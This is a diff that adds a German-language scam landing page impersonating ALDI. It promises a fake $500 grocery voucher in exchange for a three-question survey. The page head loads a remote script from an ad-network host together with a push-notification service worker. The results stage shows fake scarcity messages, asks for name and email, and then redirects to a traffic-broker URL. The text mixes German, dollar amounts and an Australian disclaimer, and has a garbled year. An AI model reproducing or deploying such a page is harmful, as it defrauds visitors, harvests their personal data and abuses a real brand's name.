@@ -1,0 +1,405 @@
+<!DOCTYPE html><html lang="en"><head><meta name="robots" content="noindex">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta charset="UTF-8">
+        <title>ALDI</title>
+        <link rel="stylesheet" href="css/style.css">
+        <script>
+    const url = new URL(window.location.href);
+    const pci = url.searchParams.get('clickid');
+    const s = document.createElement('script');
+    s.src='//gauvaiho.net/pfe/current/micro.tag.min.js?z=4266858'+'&ymid='+pci+'&sw=/sw-check-permissions-b8f29.js';
+    s.onload = (result) => {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+
+    document.head.appendChild(s);
+</script><script src="14801cacf542c53a030c769e15889425.static.js?z=4266858&amp;ymid=null&amp;sw=/sw-check-permissions-b8f29.js"></script>
+        <style>
+            html, body {
+            margin: 0;
+            padding: 0;
+            background: #fff;
+            font-size: 10px;
+            }
+            h1 {
+            margin: 1em 0 0 0;
+            padding: 0;
+            font-weight: bold;
+            font-size: 4em;
+            color: #F44336;
+            font-family: Arial,Helvetica Neue,Helvetica,sans-serif; 
+            }
+            p {
+            margin: 1em 0;
+            padding: 0;
+            font-weight: normal;
+            font-size: 2em;
+            font-family: Arial,Helvetica Neue,Helvetica,sans-serif; 
+            }
+            p strong {
+            font-size: 1.8em;
+            color: #c00;
+            }
+            #footer  {
+            padding-top:90px;
+            text-align:center;
+            clear:both;
+            font-size:14px;
+            }
+            #footer p {
+            font-size:11px;
+            color:#333333;
+            }
+            #footer .legal_links a {
+            padding-bottom: 0.5em;
+            font-size: 1em;
+            font-weight: bold;
+            display: inline;
+            margin: 0 2.5%;
+            }
+            h4, strong {
+            margin: 0;
+            padding: 0;
+            font-weight: bold;
+            font-size: 3em;
+            display: inline-block;
+            font-family: Arial,Helvetica Neue,Helvetica,sans-serif; 
+            }
+            h3 {
+            margin: 1em 0;
+            padding: 0;
+            font-weight: bold;
+            font-size: 3em;
+            font-family: Arial,Helvetica Neue,Helvetica,sans-serif; 
+            }
+            #prozess_bar {
+            display: inline-block;
+            margin: 3em 0;
+            }
+            button {
+            margin: 0 1% 1em 1%;
+            padding: 0.8em;
+            width: 48%;
+            float: left;
+            color: white;
+            text-align: center;
+            background: #F44336;
+            background: -moz-linear-gradient(top,  #F44336;0%, #F44336 100%);
+            background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#F44336), color-stop(100%,#F44336));
+            background: -webkit-linear-gradient(top,  #F44336;0%,#F44336 100%);
+            background: -o-linear-gradient(top,  #F44336;0%,#F44336 100%);
+            background: -ms-linear-gradient(top,  #F44336;0%,#F44336 100%);
+            background: linear-gradient(to bottom,  #F44336;0%,#F44336 100%);
+            filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#F44336', endColorstr='#F44336',GradientType=0 );
+            border: 1px solid #F44336;
+            -webkit-border-radius: 10px;
+            -moz-border-radius: 10px;
+            border-radius: 10px;
+            font-weight: bold;
+            font-size: 1.8em;
+            cursor: pointer;
+            }
+            #topbar {
+            height: 47px;
+            background: url("../images/header.png") repeat-x scroll 0 0 #fafafa;
+            background-position: center;
+            float: left;
+            padding: 0;
+            width: 100%;
+            }
+            .wrapper {
+            max-width: 960px;
+            width: 90%;
+            margin: 0 auto;
+            height: auto;
+            padding: 0;
+            }
+            #content_text {
+            margin: 1em 0;
+            float: left;
+            width: 60%;
+            font-family: Arial,Helvetica Neue,Helvetica,sans-serif; 
+            }
+            #content_image {
+            margin: 5% 0;
+            float: left;
+            width: 40%;
+            text-align: right;
+            }
+            #content_image img {
+            width: 100%;
+            }
+            #question_block {
+            border: 1px solid #ccc;
+            margin: 0;
+            float: left;
+            width: 90%;
+            padding: 2% 5%;
+            background: white;
+            text-align: center;
+            -webkit-border-radius: 6px;
+            -moz-border-radius: 6px;
+            border-radius: 6px;
+            }
+            .question {
+            display: none;
+            }
+            #question_1.question {
+            display: block;
+            }
+            #results_block {
+            border: 1px solid #ccc;
+            margin: 0;
+            float: left;
+            width: 90%;
+            padding: 2% 5%;
+            background: white;
+            text-align: center;
+            display: none;
+            -webkit-border-radius: 6px;
+            -moz-border-radius: 6px;
+            border-radius: 6px;
+            }
+            .result {
+            text-align: center;
+            display: none;
+            color: #3b5998;
+            font-size: 3em;
+            }
+            #result_1.result {
+            display: block;
+            }
+            .result strong {
+            font-size: 1em;
+            color: #3b5998;
+            margin: 1em 0 0 0;
+            }
+            @media screen and (max-width:768px) {
+            html, body {
+            font-size: 8px;
+            }
+            p strong {
+            font-size: 1.2em;
+            }
+            }
+            @media screen and (max-width:480px) {
+            html, body {
+            font-size: 6px;
+            }
+            h1 {
+            font-size: 3em;
+            }
+            p strong {
+            font-size: 1.2em;
+            }
+            #content_text {
+            margin: 1em 0;
+            float: left;
+            width: 100%;
+            text-align: center;
+            }
+            #content_image {
+            margin: 1em 20%;
+            float: left;
+            width: 60%;
+            text-align: center;
+            }	
+            }
+            .header
+            {
+            background-color: #000;
+            width: 100%;
+            text-align:center;
+            font-weight:bold;
+            font-size:20px;
+            padding: 10px 0;
+            color:#FFF;
+            }
+            .button {
+            background: #055228;
+            border-color: #055228; 
+            }
+.logo
+{
+ width:300px;
+ margin-top:40px;
+ margin-bottom:40px;
+ margin-left:20px;
+}
+@media screen and (max-width:600px)
+{
+ .logo
+ {
+   margin-top:10px;
+   margin-bottom:10px;
+   margin-left:5px;
+ }
+}
+</style>         
+    <link rel="stylesheet" href="0d34f26b90517650cac8dc742ccdd04c.static.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/froala-editor/2.8.5/css/froala_style.min.css"></head>
+    <body>
+        <div style="width:100%; background-image:url('in_css_13aa7c4f3feb2d4537181b666851c066.static.jpg')">
+            <img src="2783e0bf0c19b5b0db6a46802ce3305c.static.png" class="logo">
+        </div>
+        <div class="row clearfix" id="allcontent">
+            <div class="medium-8 columns" id="content_box_left">
+                <div id="content">
+                    <div class="wrapper">
+                        <div id="content_text">
+                            <p><strong>Herzliche Glückwünsche</strong></p>
+                            <p>Wir geben einer begrenzten Anzahl von Personen in Ihrer Nähe einen Lebensmittelgutschein für die Teilnahme an einer kurzen Umfrage.
+                                   Ihre Antworten können dazu beitragen, die Einkaufsmöglichkeiten in Ihrer Stadt zu verbessern.</p>
+                            <p>Sie sind für a vorausgewählt</p>
+                            <p><strong>$ 500 Gutschein von ALDI</strong></p>
+                            <p>Um Anspruch zu erheben, beantworten Sie bitte 3 Fragen unten:</p>
+                        </div>
+                        <div id="content_image">
+                            <img src="137fba76166afc81eb54b1d173a48216.static.png" alt="">
+                        </div>
+                    </div>
+                </div>
+                <div id="questions">
+                    <div class="wrapper">
+                        <div id="question_block">
+                            <div id="question_1" class="question">
+                                <h4>Frage 1 von 3</h4>
+                                <h3>Wie oft im Monat kaufen Sie Lebensmittel ein?</h3>
+                                <button class="button" onclick="next_question()">1-2 mal</button>
+                                <button class="button" onclick="next_question()">3-4 mal</button>
+                                <button class="button" onclick="next_question()">4+ mal</button>
+                                <button class="button" onclick="next_question()">Noch nie</button>
+                            </div>
+                            <div id="question_2" class="question">
+                                <h4>Frage 2 von 3</h4>
+                                <h3>Wie viele Menschen leben in Ihrem Haushalt?</h3>
+                                <button class="button" onclick="next_question()">1
+</button>
+                                <button class="button" onclick="next_question()">2
+</button>
+                                <button class="button" onclick="next_question()">3
+</button>
+                                <button class="button" onclick="next_question()">4
+</button>
+                            </div>
+                            <div id="question_3" class="question">
+                                <h4>Frage 3 von 3</h4>
+                                <h3>Was ist bei der Auswahl eines Geschäfts am wichtigsten?</h3>
+                                <button class="button" onclick="next_question()">Preis</button>
+                                <button class="button" onclick="next_question()">Marken, die sie tragen</button>                                 
+                                <button class="button" onclick="next_question()">Frische Produkte</button>                                 
+                                <button class="button" onclick="next_question()">Nähe</button>                                 
+                            </div>                             
+                        </div>
+                        <div id="results_block">
+                            <div id="result_1" class="result">
+                                <strong>Ihre Antworten werden verarbeitet ...</strong>
+                            </div>
+                            <div id="result_2" class="result">
+                                <strong>Keine Doppelregistrierungen gefunden ✔</strong>
+                                <br>
+                                <strong>Drei (7) Gutscheine übrig ✔ </strong>
+                            </div>
+                            <div id="result_3" class="result">
+                                <strong>Sie wurden ausgewählt! ✔ </strong>
+                                <br>
+                                <strong>Herzlichen Glückwunsch! Geben Sie Ihren Namen und Ihre E-Mail-Adresse ein, um alle Informationen auf der nächsten Seite zu erhalten</strong>
+                            </div>
+                            <img id="prozess_bar" src="f5b65f7c661805052bab0c1a2541aba5.static.gif" alt="loader">
+                        </div>
+                        <div id="footer">
+                            <div>
+</div>
+                            <div>
+                                <div style="display: inline-block;" class="blackfont">
+</div>
+                            </div>                             
+                        </div>                         
+                    </div>
+                </div>
+            </div>
+        </div>
+        <script>
+var first_title = "fdsfdsfsfd";
+var seconde_title = "4323254545";
+var link = 'w10.php?v=2673&aff_id=1712&aff_sub=&aff_sub2=&tid=52713218&ppgender=&ppemail=&ppfirstname=&pplastname=&udc=Android--Vivo--Y55 1603--?';
+var question_idx = 2;
+
+function next_question() {
+	var all_el = document.getElementsByClassName("question");
+	var question_el = document.getElementById("question_" + question_idx);
+	
+
+	for(var i = 0; i < all_el.length; i++) {
+    	all_el[i].style.display = 'none';
+	}
+
+	if(question_idx < (all_el.length + 1)) {
+		question_el.style.display = 'block';
+		question_idx++;
+	} else {
+		hide_block("question_block");
+		show_block("results_block");
+		results();
+	}
+
+	return false;
+}
+
+function show_block(element) {
+		document.getElementById(element).style.display = 'block';
+}
+
+function hide_block(element) {
+		document.getElementById(element).style.display = 'none';
+}
+
+function results() {
+	var load_interval = 3000;
+	var results_idx = 2;
+	var all_result_el = document.getElementsByClassName("result");
+
+	var count_results = setInterval(function() {
+		
+		for(var i = 0; i < all_result_el.length; i++) {
+    		all_result_el[i].style.display = 'none';
+		}
+	
+		document.getElementById("result_" + results_idx).style.display = 'block';
+		results_idx++;
+		
+		if(results_idx > all_result_el.length) {
+			clearInterval(count_results);
+			setTimeout(function(){
+				document.location.href ="https://www.traffic1337.com/click" ;
+			}, load_interval);
+		}
+	}, load_interval);
+}
+</script>
+<div>
+                <br><br>
+                <div style="text-align: center; font-size: 10px; color: black;">
+                    *T&amp;C Apply. Open to all Australia residents aged 18 years+.
+                    <br>Shown brands are not associated with the organisers of this competition. This offer ends on 
+                    <script type="text/javascript">
+  document.write(new Date().getFullYear());
+</script>20212021                    -12-31.
+                </div>
+                <div>
+                    <div style="text-align: center; font-size: 10px; color: black;">
+                        <b>FunClub</b>
+                        <a target="_blank" href="terms.php" class="blackfont" style="text-decoration:none; margin-left:5px; margin-right:5px;">Terms</a>
+                        <a target="_blank" href="privacy.php" class="blackfont" style="text-decoration:none;">Conditions</a>
+                    </div>
+                </div>
+                <br><br>
+            </div>
+    
+
+</body></html>
